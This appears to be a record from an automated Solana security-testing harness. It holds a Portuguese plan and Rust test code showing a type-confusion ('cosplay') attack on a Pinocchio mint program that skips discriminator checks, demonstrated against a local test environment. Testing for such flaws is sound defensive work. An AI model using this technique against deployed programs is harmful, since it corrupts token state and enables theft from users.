attempts.raw:
{
  "plan": "O programa `mint` (Pinocchio) le e escreve supply/balance em offsets fixos (40..48 e 48..56) de accounts[0] sem verificar discriminador ou layout. O baseline usa uma conta 'ledger' legitima com esses campos zerados e chama mint com amount=100, provando que o cenario esta montado. O ataque fornece uma conta de outro tipo (ex.: uma conta 'Config' com discriminador diferente) cujos bytes 40..56 sao interpretaveis como supply/balance, e chama a mesma instrucao mint. O efeito medido e que os bytes 40..56 da conta de outro tipo foram alterados (supply/balance incrementados), demonstrando que o programa tratou dados de um tipo diferente como ledger e corrompeu o estado.",
  "scenario": "let ledger_key = Pubkey::new_unique();
let mut ledger_data = vec![0u8; 64];
ledger_data[40..48].copy_from_slice(&0u64.to_le_bytes());
ledger_data[48..56].copy_from_slice(&0u64.to_le_bytes());
let ledger = account(&env.program_id, &ledger_data, None);

let amount: u64 = 100;
let mut ix_data = vec![0u8];
ix_data.extend_from_slice(&amount.to_le_bytes());
let metas = vec![AccountMeta::new(ledger_key, false)];
let ix = env.raw_ix(&ix_data, metas.clone());
let contas = vec![(ledger_key, ledger.clone())];

let base = env.baseline("mint legitimo em ledger", &ix, &contas);

let cosplay_key = Pubkey::new_unique();
let mut cosplay_data = vec![0u8; 64];
cosplay_data[0..8].copy_from_slice(&[9u8; 8]);
cosplay_data[40..48].copy_from_slice(&7u64.to_le_bytes());
cosplay_data[48..56].copy_from_slice(&3u64.to_le_bytes());
let cosplay = account(&env.program_id, &cosplay_data, None);

let atk_metas = vec![AccountMeta::new(cosplay_key, false)];
let atk_ix = env.raw_ix(&ix_data, atk_metas);
let atk_contas = vec![(cosplay_key, cosplay.clone())];

let r = env.attack("mint em conta de outro tipo (cosplay)", &atk_ix, &atk_contas);
if r.program_result == ProgramResult::Success {
    let d = after(&r, &cosplay_key).data();
    let supply = read_u64(d, 40);
    let balance = read_u64(d, 48);
    env.effect("conta de outro tipo teve supply/balance corrompidos", supply == 7 + amount && balance == 3 + amount);
}"
}

